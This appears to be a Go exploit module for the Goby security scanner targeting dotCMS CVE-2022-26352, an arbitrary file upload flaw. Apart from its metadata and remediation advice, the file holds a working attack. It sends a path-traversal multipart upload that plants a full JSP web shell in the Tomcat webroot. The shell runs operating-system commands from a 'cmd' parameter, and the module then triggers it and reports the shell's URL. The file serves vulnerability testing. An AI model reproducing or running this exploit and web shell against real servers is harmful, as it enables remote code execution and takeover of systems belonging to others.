package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "dotCMS content Arbitrary File Upload (CVE-2022-26352)",
    "Description": "<p>Dotcms dotCMS is a set of content management system (CMS) of American dotCMS (Dotcms) company. The system supports RSS feeds, blogs, forums and other modules, and is easy to expand and build.</p><p>There is an arbitrary file upload vulnerability in the /api/content/ path of the DotCMS management system, and attackers can upload malicious Trojans to obtain server permissions.</p>",
    "Impact": "dotCMS content Arbitrary File Upload (CVE-2022-26352)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.dotcms.com/\">https://www.dotcms.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "dotCMS",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "dotCMS 管理系统 content 任意文件上传漏洞（CVE-2022-26352）",
            "Description": "<p>Dotcms dotCMS是美国dotCMS（Dotcms）公司的一套内容管理系统（CMS）。该系统支持RSS订阅、博客、论坛等模块，并具有易于扩展和构建的特点。</p><p>DotCMS管理系统 /api/content/路径存在任意文件上传漏洞，攻击者可上传恶意木马，获取服务器权限。</p>",
            "Impact": "<p>DotCMS管理系统 /api/content/路径存在任意文件上传漏洞，攻击者可上传恶意木马，获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.dotcms.com/\">https://www.dotcms.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p>",
            "Product": "dotCMS",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "dotCMS content Arbitrary File Upload (CVE-2022-26352)",
            "Description": "<p>Dotcms dotCMS is a set of content management system (CMS) of American dotCMS (Dotcms) company. The system supports RSS feeds, blogs, forums and other modules, and is easy to expand and build.</p><p>There is an arbitrary file upload vulnerability in the /api/content/ path of the DotCMS management system, and attackers can upload malicious Trojans to obtain server permissions.</p>",
            "Impact": "dotCMS content Arbitrary File Upload (CVE-2022-26352)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.dotcms.com/\">https://www.dotcms.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Product": "dotCMS",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "body=\"DotCMS\"",
    "GobyQuery": "body=\"DotCMS\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.dotcms.com/",
    "DisclosureDate": "2022-05-05",
    "References": [
        "https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-26352"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "path",
            "type": "input",
            "value": "../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10360"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/api/content/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------aadc326f7ae3eac3")
			cfg.Data = `--------------------------aadc326f7ae3eac3
Content-Disposition: form-data; name="name"; filename="../../../../../../../../../dsjakfdaal/1.txt"
Content-Type: text/plain
test
--------------------------aadc326f7ae3eac3--`
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 500 && strings.Contains(resp.RawBody, "could not be created") && strings.Contains(resp.RawBody, "File")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			path := ss.Params["path"].(string)
			cmd := ss.Params["cmd"].(string)
			RandName := goutils.RandomHexString(6) + ".jsp"
			uri1 := "/api/content/"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "multipart/form-data; boundary=------------------------aadc326f7ae3eac3")
			cfg1.Data = "--------------------------aadc326f7ae3eac3\r\nContent-Disposition: form-data; name=\"name\"; filename=\"" + path + RandName + "\"\r\nContent-Type: text/plain\r\n\r\n<%@ page import=\"java.util.*,java.io.*\"%>\r\n<%\r\n%>\r\n<HTML><BODY>\r\nCommands with JSP\r\n<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\r\n<INPUT TYPE=\"text\" NAME=\"cmd\">\r\n<INPUT TYPE=\"submit\" VALUE=\"Send\">\r\n</FORM>\r\n<pre>\r\n<%\r\nif (request.getParameter(\"cmd\") != null) {\r\n    out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\r\n    Process p;\r\n    if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\r\n        p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\"));\r\n    }\r\n    else{\r\n        p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\r\n    }\r\n    OutputStream os = p.getOutputStream();\r\n    InputStream in = p.getInputStream();\r\n    DataInputStream dis = new DataInputStream(in);\r\n    String disr = dis.readLine();\r\n    while ( disr != null ) {\r\n    out.println(disr);\r\n    disr = dis.readLine();\r\n    }\r\n}\r\n%>\r\n</pre>\r\n</BODY></HTML>\r\n--------------------------aadc326f7ae3eac3--"
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 500 {
				uri2 := "/" + RandName + "?cmd=" + cmd
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
					expResult.Output = "WebShell: " + expResult.HostInfo.FixedHostInfo + "/" + RandName + "\n\n\n\n" + resp2.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
